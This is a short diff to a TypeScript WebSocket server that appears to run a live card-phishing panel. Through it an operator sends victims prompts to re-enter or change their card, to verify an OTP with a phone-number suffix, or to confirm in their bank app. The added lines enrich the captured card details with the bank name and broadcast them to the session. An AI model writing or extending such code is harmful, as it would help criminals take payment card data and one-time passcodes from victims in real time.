@@ -329,7 +329,13 @@ export function setupWebSocket(server: any) {
           if (action === 'custom_prompt') custMsg = message || '';
           if (action === 'change_card_prompt') custMsg = message || '请更换卡片重新支付';
 
-          // For OTP verify actions, include phone suffix in the message
+          // For app_verify, ensure cardInfo is enriched with bankName before sending
+          if (action === 'app_verify' && s && !(s as any).cardInfo.bankName) {
+            try {
+              await enrichAndSaveCardInfo((s as any).cardInfo);
+              broadcast('session_update', { sessionId, cardInfo: { ...(s as any).cardInfo } }, sessionId);
+            } catch {}
+          }
           if (action === 'otp_verify' || action === 'custom_otp_tail') {
             phoneSuffix = action === 'custom_otp_tail' ? (message || '****') : '';
             if (!phoneSuffix && s) {
